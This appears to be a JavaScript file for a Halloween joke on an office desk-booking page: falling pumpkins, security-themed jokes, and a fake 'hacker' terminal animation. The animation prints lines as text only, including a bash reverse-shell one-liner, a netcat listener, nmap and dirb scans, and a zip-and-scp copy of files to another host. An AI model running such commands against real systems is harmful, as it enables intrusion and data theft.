(function () {
  var END = Date.parse("2026-11-01T00:00:00+10:30");
  var END_LINE = "That's the list. Nothing repeats unless you start a new one.";
  var SCARES = [
  "Your desk has been booked. The HADID is just \"no\".",
  "Something is sitting in WS7.147. It will not cancel.",
  "The 7-day limit does not apply to ghosts. They booked all of November.",
  "Do not scream. Service desk will log it and tell you to reboot.",
  "The scariest person here books a desk, then works from home.",
  "Your screen is unlocked. The ghost is in your email. So is everyone walking past.",
  "This would have been a phishing email. You would have clicked it. We both know.",
  "Do not plug that USB in. It is not a scare. It is a career.",
  "A ghost rang the service desk. They told it to turn the haunting off and on again.",
  "Boo. If you are not coming in, cancel the desk. Even the ghost is sick of no-shows.",
  "MFA is the only thing between you and a pumpkin that knows your password.",
  "The password on the sticky note is possessed. Change it. Then eat the note.",
  "Tailgating is not a Halloween activity. Hold the door. I will haunt your HADID.",
  "Lock your screen. The desk next to you is already in your OneDrive.",
  "You left your laptop. Security has it. The pumpkin is negotiating.",
  "Clicking this did not fail a phishing test. Clicking the other thing did.",
  "The person who never cancels is still the real monster.",
  "Security saw you click this. A P1 is open. The category is pumpkin.",
  "Someone forwarded the scare to the whole floor. Security would like a word.",
  "Incident logged. Category: Halloween. Impact: your dignity. Priority: low.",
  "The scariest email this month was not a ghost. It was the shared mailbox.",
  "A ghost tried to sign in. HADIDs only. It left offended.",
  "You clicked this at work. That is the scary part.",
  "Service desk closed your ticket as working as designed. The haunting stays.",
  "The pumpkin asked for a standing desk. They told it to try turning it off and on.",
  "Boo. That was the whole scare. Book a desk, coward.",
  "A skeleton took the desk next to you. It showed up. You did not. We noticed.",
  "Boo. You still have to come into the office. The calendar was not a hint.",
  "A vampire asked for a hot desk. We opened the blinds and made him do MFA.",
  "Your chair put in a complaint. It would like a person who turns up. And a wipe.",
  "There is a pumpkin on the desk. Do not eat it. Do not book it. Do not reply all.",
  "This scare was booked seven weekdays ago. You cannot cancel it.",
  "Ghosts do not need a HADID. You do. Service desk will not make an exception.",
  "HR said we cannot scare you. Security said the sticky note was worse anyway.",
  "If that made you jump, wait until the printer tells you to reboot it yourself.",
  "The pumpkin has been here longer than your booking. It also locked its screen.",
  "You can leave. It already signed in as you. Hope you had MFA on.",
  "A werewolf wanted every Tuesday. We said one desk, and no, you cannot share the login.",
  "Congratulations. You replied all. The demon is the least of your problems.",
  "The lights just flickered. Service desk says that is a you problem.",
  "Boo. Your inbox called. Four thousand unread. None of them are a ghost.",
  "We checked under the desk. It was a cable. You still should not have kicked it.",
  "Please do not sacrifice a workstation. Service desk is tired and it is only Monday.",
  "The pumpkin wanted your HADID. We sent it to the phishing quiz instead.",
  "That was the last scare. That was a lie. Same energy as \"the wifi is fine\".",
  "A zombie filled the form in properly. Service desk framed it.",
  "Your standing desk is fine. The person who drops it and walks off is the problem.",
  "A witch asked for the whole floor. We said one desk, and stop CC'ing everyone.",
  "The scare is free. The desk is not haunted. Your laptop battery is.",
  "You wrote the password on the pumpkin. We are not angry. We are also angry.",
  "Someone booked one desk for twelve people. Incredible. Wrong. But incredible.",
  "Your out of office is on. So is your booking. Pick a struggle.",
  "The wifi password is not password. The fact I had to say that is the scare.",
  "Boo. Fourteen tabs open. One of them is definitely a mistake.",
  "Log off the shared PC. The next person does not need your entire life.",
  "A pumpkin left a Teams call running for eight hours. Camera on. We have all seen enough.",
  "You badged, then walked in behind someone else. The door saw you. So did I.",
  "Security told you to change your password. You added a 1. Bold strategy.",
  "The real monster replies \"thanks\" to the all-staff email.",
  "Happy Halloween. Cancel the desk if you are not coming. The ghost has a life.",
  "OCIO has noted the pumpkin. A paper will follow. The pumpkin will still be here.",
  "OCIO stood up a working group. The first action was to book the next working group.",
  "A vendor brought a solution. It was one slide. The slide had a pumpkin on it.",
  "The vendor said it works in their environment. Their environment is not this floor.",
  "The vendor brought chocolates. They also brought a contract. Read the contract first.",
  "The consultant has been here since March. The pumpkin started this week and has done more.",
  "A consultant asked who the pumpkin reports to, wrote it down, and billed the hour.",
  "The consultant proposed a pumpkin operating model. We already had a pumpkin.",
  "Procurement needs three quotes for the scare. The scare got bored and left.",
  "Procurement asked if the ghost is on the panel. It is not. It is in the corner.",
  "Buying the lollies took longer than Halloween. Procurement would like that minuted.",
  "HR would prefer you did not say boo in the all-staff email. Hello is fine.",
  "HR has a costume policy. It is longer than the costume. Please read it before the ears.",
  "HR reminded the skeleton to finish the mandatory training. The skeleton has not.",
  "Architecture drew the pumpkin. It is a box. The box is labelled pumpkin. There are arrows.",
  "Architecture has a future state for your desk. Until it lands, please keep hovering.",
  "Architecture supports Halloween, as long as it aligns to the principles.",
  "OCIO has taken the pumpkin offline for comment. Comments close after Halloween.",
  "OCIO circulated a minute. The action was to note the minute.",
  "OCIO asked for a brief on the scare. The brief was \"boo\". They have asked for a shorter one.",
  "OCIO parked the pumpkin with the other parked items. It has friends there.",
  "OCIO wanted a one-pager. It is now nine pages. Everyone is pleased.",
  "OCIO endorsed the pumpkin in principle. The pumpkin had already started.",
  "The consultant is across it. Nobody, including the consultant, knows what it is.",
  "A consultant joined the haunting to observe. The invoice arrived before the notes.",
  "The consultant said we should lean in to the pumpkin. We were already sitting on it.",
  "Two consultants disagreed about the pumpkin. Both billed. The pumpkin was fine.",
  "The consultant's last day was Friday. The badge still works. So does the invoice.",
  "A consultant asked for the as-is pumpkin and the to-be pumpkin. Same pumpkin.",
  "The vendor's pumpkin is cloud-based. It still needs a desk, and a plug.",
  "A vendor demoed a Halloween platform. The pumpkin in the corner did nothing.",
  "The vendor renewal is due. So is the scare. Only one of those can be cancelled.",
  "Three vendors proposed a pumpkin. Same pumpkin. Three logos.",
  "The vendor said onboarding would take a week. The pumpkin took ten minutes.",
  "A vendor booked a desk, did not come, and sent a slide. We have kept the slide."
  ];
  if (Date.now() >= END) return;
  var pre = new Image();
  pre.src = "/gotya.jpg";

  function shuffle(list) {
    var order = list.slice();
    for (var i = order.length - 1; i > 0; i--) {
      var j = Math.floor(Math.random() * (i + 1));
      var swap = order[i];
      order[i] = order[j];
      order[j] = swap;
    }
    return order;
  }

  var deck = shuffle(SCARES);
  var step = -1;
  var open = false;
  var offerReal = false;
  var phase = null;
  var photoReady = false;
  var timers = [];

  function pumpkinNode(i) {
    var tones = [
      ["#e86810", "#ff9a1f"],
      ["#d24a18", "#ff7040"],
      ["#f0a01a", "#ffc14a"],
      ["#c45a22", "#e8883a"],
      ["#ef7a28", "#ffb060"],
      ["#b8431c", "#e07040"]
    ];
    var tone = tones[i % tones.length];
    var bubble = i % 7 === 0;
    var size = 52 + (i % 4) * 12;
    var el = document.createElement("div");
    el.className = "pumpkin-drop";
    el.innerHTML = '<svg class="pumpkin" viewBox="0 0 80 96" aria-hidden="true" style="width:' + size + 'px;height:' + (size * 1.2) + 'px"><path d="M34 22c2-14 16-16 18-6 1 6-6 10-10 11" fill="#2f9a46"/><ellipse cx="40" cy="58" rx="34" ry="32" fill="' + tone[0] + '"/><ellipse cx="40" cy="58" rx="28" ry="32" fill="' + tone[1] + '"/><polygon points="20,44 34,44 27,58" fill="#24160c"/><polygon points="46,44 60,44 53,58" fill="#24160c"/><polygon points="40,56 33,66 47,66" fill="#24160c"/><polygon points="16,70 26,64 34,74 40,64 46,74 54,64 64,70 56,82 40,86 24,82" fill="#24160c"/></svg>' +
      (bubble ? '<span class="jk-bubble" style="color:' + tone[1] + ';border-color:' + tone[0] + '">JK wanted more pumpkins</span>' : "");
    return { el: el, r: size * 0.42, ox: size / 2, oy: size * 1.2 * (58 / 96) };
  }

  function startPumpkins(layer) {
    var balls = [];
    var w = window.innerWidth || 1200;
    var i;
    for (i = 0; i < 82; i++) {
      var node = pumpkinNode(i);
      layer.appendChild(node.el);
      balls.push({
        el: node.el,
        r: node.r,
        ox: node.ox,
        oy: node.oy,
        x: 0,
        y: 0,
        vx: ((i % 5) - 2) * 22,
        vy: 50 + (i % 6) * 28
      });
    }
    function place() {
      var width = window.innerWidth || w;
      var cols = Math.max(4, Math.floor(width / 120));
      balls.forEach(function (ball, n) {
        var col = n % cols;
        var row = Math.floor(n / cols);
        ball.x = (col + 0.5) * (width / cols);
        ball.y = -30 - row * (ball.r * 2 + 80);
      });
    }
    place();
    var last = 0;
    function tick(now) {
      requestAnimationFrame(tick);
      if (document.hidden) return;
      var dt = last ? Math.min(0.032, (now - last) / 1000) : 0.016;
      last = now;
      var width = window.innerWidth || w;
      var height = window.innerHeight || 800;
      var a, b, n, dx, dy, dist, min, nx, ny, overlap, rel, pass;
      for (n = 0; n < balls.length; n++) {
        a = balls[n];
        a.vy += 80 * dt;
        a.x += a.vx * dt;
        a.y += a.vy * dt;
        if (a.x < a.r) { a.x = a.r; a.vx = Math.abs(a.vx); }
        if (a.x > width - a.r) { a.x = width - a.r; a.vx = -Math.abs(a.vx); }
        if (a.y - a.r > height + 30) {
          a.y = -90 - (n % 6) * 36;
          a.x = a.r + ((n * 97) % Math.max(1, width - a.r * 2));
          a.vy = 60 + (n % 5) * 24;
          a.vx = ((n % 5) - 2) * 20;
        }
        if (a.vy > 280) a.vy = 280;
        if (a.vy < -160) a.vy = -160;
      }
      for (pass = 0; pass < 3; pass++) {
        for (n = 0; n < balls.length; n++) {
          a = balls[n];
          for (var j = n + 1; j < balls.length; j++) {
            b = balls[j];
            dx = b.x - a.x;
            dy = b.y - a.y;
            min = a.r + b.r;
            if (dx > min || dx < -min || dy > min || dy < -min) continue;
            dist = Math.hypot(dx, dy);
            if (dist >= min || dist < 0.01) continue;
            nx = dx / dist;
            ny = dy / dist;
            overlap = (min - dist) * 0.5;
            a.x -= nx * overlap;
            a.y -= ny * overlap;
            b.x += nx * overlap;
            b.y += ny * overlap;
            rel = (b.vx - a.vx) * nx + (b.vy - a.vy) * ny;
            if (rel > 0) continue;
            rel *= 0.92;
            a.vx += rel * nx;
            a.vy += rel * ny;
            b.vx -= rel * nx;
            b.vy -= rel * ny;
          }
        }
      }
      for (n = 0; n < balls.length; n++) {
        a = balls[n];
        a.el.style.transform = "translate3d(" + (a.x - a.ox) + "px," + (a.y - a.oy) + "px,0)";
      }
    }
    if (!window.matchMedia("(prefers-reduced-motion: reduce)").matches) requestAnimationFrame(tick);
  }

  function mountBanner() {
    var root = document.getElementById("occasion");
    if (!root) return;
    var layer = document.createElement("div");
    layer.className = "pumpkins";
    layer.setAttribute("aria-hidden", "true");
    root.appendChild(layer);
    startPumpkins(layer);
    var banner = document.createElement("div");
    banner.className = "bday-banner";
    banner.innerHTML = '<div><div class="bday-kicker">Until 31 October</div><div class="bday-title">Happy Halloween.</div><p class="bday-joke">Book like normal. The pumpkins are not a desk.</p></div><button type="button" class="scare-btn scare-hero" id="scareMe">Scare me</button>';
    root.appendChild(banner);
    document.getElementById("scareMe").onclick = function () { nextScare(false); };
  }

  function lineText() {
    if (step >= deck.length) return END_LINE;
    return deck[step];
  }

  function nextScare(fromAnother) {
    if (fromAnother) offerReal = true;
    open = true;
    if (step >= deck.length) {
      deck = shuffle(SCARES);
      step = 0;
    } else {
      step += 1;
    }
    renderScare();
  }

  function closeScare() {
    open = false;
    offerReal = false;
    var el = document.getElementById("scareLayer");
    if (el) el.remove();
  }

  function renderScare() {
    var el = document.getElementById("scareLayer");
    if (!open || phase) {
      if (el) el.remove();
      return;
    }
    if (!el) {
      el = document.createElement("div");
      el.id = "scareLayer";
      el.className = "scare";
      el.setAttribute("role", "dialog");
      el.setAttribute("aria-modal", "true");
      el.setAttribute("aria-label", "A very mild scare");
      document.body.appendChild(el);
    }
    el.textContent = "";
    var p = document.createElement("p");
    p.className = "scare-line";
    p.textContent = lineText();
    var actions = document.createElement("div");
    actions.className = "scare-actions";
    var another = document.createElement("button");
    another.type = "button";
    another.className = "scare-btn";
    another.textContent = "Another one";
    another.onclick = function () { nextScare(true); };
    var enough = document.createElement("button");
    enough.type = "button";
    enough.className = "scare-quiet";
    enough.textContent = "That's enough";
    enough.onclick = closeScare;
    actions.appendChild(another);
    actions.appendChild(enough);
    el.appendChild(p);
    el.appendChild(actions);
    if (offerReal) {
      var real = document.createElement("button");
      real.type = "button";
      real.className = "real-box";
      real.textContent = "Really scare me";
      real.onclick = reallyScare;
      el.appendChild(real);
    }
  }

  function clearTimers() {
    timers.forEach(function (id) { clearTimeout(id); });
    timers = [];
  }

  function hackSchedule() {
    var rows = [];
    var t = 500;
    var scan = false;
    function say(text, wait) {
      if (text.indexOf("nmap ") !== -1 || text.indexOf("dirb ") !== -1) scan = true;
      if (text.indexOf("root@bragg:~# ssh") === 0) scan = false;
      rows.push({ at: t, text: text });
      var intro = text.indexOf("Can't") === 0 || text.indexOf("Well,") === 0;
      var hold = text.indexOf("bash -i") !== -1 || text.indexOf("connect to") === 0;
      var bar = text.indexOf("[") === 0;
      var delay = intro ? 1040 : hold ? 850 : bar ? 230 : scan ? 200 : Math.min(72, wait);
      t += delay;
    }
    say("Can't believe you picked that.", 1600);
    say("Well, here it goes...", 1600);
    say("root@bragg:~# nc -lvnp 4444", 800);
    say("listening on [any] 4444 ...", 900);
    say("connect to [10.14.7.23] from (UNKNOWN) [10.14.7.42] 51332", 700);
    say("bash -i >& /dev/tcp/10.14.7.23/4444 0>&1", 800);
    say("bash: no job control in this shell", 600);
    say("ops@laptop:~$ ", 700);
    say("root@bragg:~# ip -4 addr show wlan0", 700);
    say("3: wlan0: <BROADCAST,UP,LOWER_UP> mtu 1500", 450);
    say("    inet 10.14.7.23/24 brd 10.14.7.255 scope global dynamic wlan0", 900);
    say("root@bragg:~# nmap -sn -T4 10.14.7.0/24", 1000);
    say("Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-18 21:51 ACDT", 700);
    var hosts = [
      { ip: "10.14.7.1", up: true, ms: "0.004" },
      { ip: "10.14.7.12", up: false },
      { ip: "10.14.7.23", up: true, ms: "0.011" },
      { ip: "10.14.7.42", up: true, ms: "0.006" },
      { ip: "10.14.7.88", up: false },
      { ip: "10.14.7.104", up: true, ms: "0.019" }
    ];
    hosts.forEach(function (host) {
      say("Nmap scan report for " + host.ip, 450);
      say(host.up ? "Host is up (" + host.ms + "s latency)." : "Host is down.", 700);
    });
    say("Nmap done: 256 IP addresses (4 hosts up) scanned in 3.12 seconds", 900);
    say("root@bragg:~# nmap -sS -sV -p 22,80,139,443,445,3389,8080 10.14.7.42", 1100);
    say("Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-18 21:52 ACDT", 650);
    say("Nmap scan report for laptop.lan (10.14.7.42)", 550);
    say("Host is up (0.006s latency).", 450);
    say("Not shown: 993 closed tcp ports (reset)", 500);
    say("PORT     STATE SERVICE       VERSION", 400);
    say("22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 24.04", 700);
    say("80/tcp   open  http          nginx 1.27.2", 650);
    say("443/tcp  open  ssl/http      nginx 1.27.2", 650);
    say("8080/tcp open  http          Jetty 11.0.20", 700);
    say("3389/tcp closed ms-wbt-server", 550);
    say("Service Info: OS: Linux; CPE: cpe:/o:canonical:ubuntu_linux:24.04", 900);
    say("root@bragg:~# dirb http://10.14.7.42/ /usr/share/dirb/wordlists/common.txt -r -S", 1200);
    say("-----------------", 280);
    say("DIRB v2.22", 400);
    say("By The Dark Raver", 350);
    say("START_TIME: Sun Oct 18 21:52:41 2026", 450);
    say("URL_BASE: http://10.14.7.42/", 400);
    say("WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt", 500);
    say("OPTION: Recursive (-r)", 400);
    say("-----------------", 350);
    say("--> Testing: http://10.14.7.42/secret/", 500);
    say("(!) NOT FOUND: http://10.14.7.42/secret/", 600);
    say("--> Testing: http://10.14.7.42/backup/", 500);
    say("(!) NOT FOUND: http://10.14.7.42/backup/", 600);
    [
      ["index.html", "CODE:200|SIZE:1844"],
      ["images/", "CODE:200|SIZE:1220"],
      ["robots.txt", "CODE:200|SIZE:68"],
      ["api/", "CODE:401|SIZE:42"],
      ["desks/", "CODE:200|SIZE:4096"],
      ["bookings/", "CODE:200|SIZE:880"],
      ["desks/floor7/", "CODE:200|SIZE:22108"]
    ].forEach(function (row) {
      say("+ http://10.14.7.42/" + row[0] + " (" + row[1] + ")", 750);
    });
    say("-----------------", 400);
    say("END_TIME: Sun Oct 18 21:53:46 2026", 450);
    say("DOWNLOADED: 4612 - FOUND: 7", 1100);
    say("root@bragg:~# ssh -t ops@10.14.7.42", 900);
    say("The authenticity of host '10.14.7.42' can't be established.", 600);
    say("ED25519 key fingerprint is SHA256:kP7mR2deskbook1ng0nly.", 550);
    say("Are you sure you want to continue connecting (yes/no)? yes", 700);
    say("Warning: Permanently added '10.14.7.42' (ED25519) to the list of known hosts.", 500);
    say("ops@10.14.7.42's password:", 800);
    say("Linux laptop 6.8.0-45-generic #45-Ubuntu SMP x86_64", 600);
    say("ops@laptop:~$ ", 500);
    say("ops@laptop:~$ zip -r /tmp/found.zip desks/ bookings/ images/ robots.txt index.html", 900);
    say("  adding: desks/ (stored 0%)", 450);
    say("  adding: desks/floor7/ (deflated 62%)", 500);
    say("  adding: bookings/ (deflated 54%)", 500);
    say("  adding: images/ (stored 0%)", 450);
    say("  adding: robots.txt (deflated 8%)", 400);
    say("  adding: index.html (deflated 61%)", 500);
    say("ops@laptop:~$ ls -l /tmp/found.zip", 700);
    say("-rw-rw-r-- 1 ops ops 188416 Oct 18 21:54 /tmp/found.zip", 600);
    say("ops@laptop:~$ scp /tmp/found.zip bragg@10.14.7.23:/incoming/found.zip", 800);
    say("sending /tmp/found.zip", 500);
    say("[##                  ]  10%", 450);
    say("[#####               ]  28%", 450);
    say("[##########          ]  51%", 450);
    say("[###############     ]  74%", 450);
    say("[##################  ]  91%", 450);
    say("[####################] 100%  184KB  2.4MB/s", 700);
    say("ops@laptop:~$ rm -f /tmp/found.zip", 600);
    say("ops@laptop:~$ exit", 500);
    say("Connection to 10.14.7.42 closed.", 800);
    say("root@bragg:~# ls -l /incoming/found.zip", 700);
    say("-rw-r--r-- 1 bragg bragg 188416 Oct 18 21:54 /incoming/found.zip", 900);
    return { rows: rows, doneAt: t + 4000 };
  }

  function showGotya() {
    phase = "gotya";
    var shade = document.getElementById("termLayer");
    if (!shade) return;
    shade.textContent = "";
    var box = document.createElement("div");
    box.className = "gotya";
    var img = document.createElement("img");
    img.alt = "Got ya";
    img.src = "/gotya.jpg";
    box.appendChild(img);
    shade.appendChild(box);
    function reveal() {
      if (photoReady) return;
      photoReady = true;
      var btn = document.createElement("button");
      btn.type = "button";
      btn.className = "scare-quiet";
      btn.textContent = "That's enough";
      btn.onclick = function () {
        phase = null;
        offerReal = false;
        photoReady = false;
        var layer = document.getElementById("termLayer");
        if (layer) layer.remove();
        renderScare();
      };
      box.appendChild(btn);
    }
    img.onload = reveal;
    if (img.complete && img.naturalWidth) reveal();
  }

  function reallyScare() {
    phase = "run";
    photoReady = false;
    clearTimers();
    renderScare();
    var old = document.getElementById("termLayer");
    if (old) old.remove();
    var shade = document.createElement("div");
    shade.id = "termLayer";
    shade.className = "term-shade";
    shade.setAttribute("role", "dialog");
    shade.setAttribute("aria-modal", "true");
    shade.setAttribute("aria-label", "A very fake terminal");
    shade.innerHTML = '<div class="term"><div class="term-bar"><i style="background:#ff6b7a"></i><i style="background:#f5c542"></i><i style="background:#5dffb2"></i><span>laptop — bash</span></div><div class="term-body" id="termBody"><div class="term-cursor">▋</div></div></div>';
    document.body.appendChild(shade);
    var sched = hackSchedule();
    var body = document.getElementById("termBody");
    sched.rows.forEach(function (row) {
      timers.push(setTimeout(function () {
        var line = document.createElement("div");
        line.textContent = row.text;
        var cursor = body.querySelector(".term-cursor");
        body.insertBefore(line, cursor);
        if (cursor && cursor.scrollIntoView) cursor.scrollIntoView({ block: "end" });
      }, row.at));
    });
    timers.push(setTimeout(showGotya, sched.doneAt));
  }

  mountBanner();
})();
